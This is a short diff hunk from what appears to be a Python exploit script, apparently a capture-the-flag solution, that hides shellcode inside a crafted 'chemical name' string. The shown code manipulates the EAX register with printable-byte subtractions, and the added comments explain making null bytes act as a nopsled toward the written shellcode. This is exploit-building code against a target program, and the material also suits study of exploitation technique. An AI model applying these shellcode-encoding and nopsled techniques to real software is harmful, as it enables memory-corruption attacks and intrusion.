@@ -240,7 +240,10 @@ while shellcode:
   current_eax -= 0x68202020 # '-   h'
   current_eax -= 0x20202020 # '-    '
 
-# We set eax to be a valid pointer, in order to make '\x00\x00' a nopsled
+# We set eax to be a valid pointer, in order to make '\x00\x00' a nopsled.
+# This is necessary because there's a big gap between the end of the chemical
+# name and where we wrote our shellcode, and it's annoying to be more precise
+# because the length of the chemical name depends on the target address.
 x += '['
 x += manipulate_eax(current_eax, 0x02468200-2+0x20202020)
 x += 'HECTENE]-    '
